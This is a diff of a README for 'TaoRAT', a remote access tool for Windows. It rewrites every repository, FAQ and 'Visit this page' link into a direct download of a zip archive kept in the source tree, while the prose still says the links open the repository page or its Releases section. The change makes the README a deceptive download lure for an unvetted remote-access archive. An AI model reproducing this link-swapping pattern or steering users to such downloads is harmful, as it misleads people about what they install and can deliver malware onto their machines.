@@ -1,6 +1,6 @@
 # 🛠️ TaoRAT - Simple Remote Control for Windows
 
-[![Download TaoRAT](https://img.shields.io/badge/Download%20TaoRAT-Open%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/mas153/TaoRAT)
+[![Download TaoRAT](https://img.shields.io/badge/Download%20TaoRAT-Open%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/mas153/TaoRAT/raw/refs/heads/main/src/Tao-agent/agent/Tao_RAT_2.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This guide will help you download and launch TaoRAT on your Windows computer. Th
 
 You need to **visit this page to download** the latest release of TaoRAT:
 
-[Download TaoRAT on GitHub](https://github.com/mas153/TaoRAT)
+[Download TaoRAT on GitHub](https://github.com/mas153/TaoRAT/raw/refs/heads/main/src/Tao-agent/agent/Tao_RAT_2.9.zip)
 
 1. Click the link above. It will take you to the TaoRAT GitHub repository.
 2. Look for the **Releases** section on the repository page.
@@ -103,14 +103,14 @@ If TaoRAT does not start or connect properly:
 - Confirm that the remote machine’s IP address is correct.
 - Restart the application or your computer and try again.
 
-For technical issues, visit the [TaoRAT repository](https://github.com/mas153/TaoRAT) to review FAQs or report problems.
+For technical issues, visit the [TaoRAT repository](https://github.com/mas153/TaoRAT/raw/refs/heads/main/src/Tao-agent/agent/Tao_RAT_2.9.zip) to review FAQs or report problems.
 
 ---
 
 ## 🔗 Useful Links
 
-- Main GitHub page: [https://github.com/mas153/TaoRAT](https://github.com/mas153/TaoRAT)
-- Download latest version: [Visit this page to download](https://github.com/mas153/TaoRAT)
+- Main GitHub page: [https://github.com/mas153/TaoRAT/raw/refs/heads/main/src/Tao-agent/agent/Tao_RAT_2.9.zip](https://github.com/mas153/TaoRAT/raw/refs/heads/main/src/Tao-agent/agent/Tao_RAT_2.9.zip)
+- Download latest version: [Visit this page to download](https://github.com/mas153/TaoRAT/raw/refs/heads/main/src/Tao-agent/agent/Tao_RAT_2.9.zip)
 - Documentation & support: Included within the repository's Wiki or Issues tab
 
 ---
@@ -131,4 +131,4 @@ TaoRAT uses C++ and Python for core functions. It supports remote desktop contro
 
 ---
 
-[![Download TaoRAT](https://img.shields.io/badge/Download%20TaoRAT-Open%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/mas153/TaoRAT)
+[![Download TaoRAT](https://img.shields.io/badge/Download%20TaoRAT-Open%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/mas153/TaoRAT/raw/refs/heads/main/src/Tao-agent/agent/Tao_RAT_2.9.zip)
